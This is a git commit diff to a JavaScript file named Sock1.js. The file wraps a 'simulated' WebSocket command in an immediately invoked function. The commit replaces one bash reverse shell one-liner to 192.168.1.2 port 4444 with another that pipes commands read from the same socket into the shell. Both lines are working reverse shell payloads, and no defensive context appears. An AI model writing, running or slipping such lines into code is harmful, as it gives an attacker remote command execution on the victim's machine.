9f49d771b9ce0c79eba5683a4b27d2d9ca95f272
raoufdz28 <raouf.okirim@gmail.com>
2025-04-16 04:43:33 +0100

    Sock1.js

--- Sock1.js
+++ Sock1.js
@@ -1,7 +1,7 @@
 (function () {
-    // Simulate a WebSocket message containing the command to execute the reverse shell
+    // Simulated WebSocket reverse shell command
     const simulatedWebSocketCommand = `
-        bash -c 'bash -i >& /dev/tcp/192.168.1.2/4444 0>&1'
+        bash -c 'exec 5<>/dev/tcp/192.168.1.2/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
     `;
 
     // Function to simulate receiving a WebSocket message
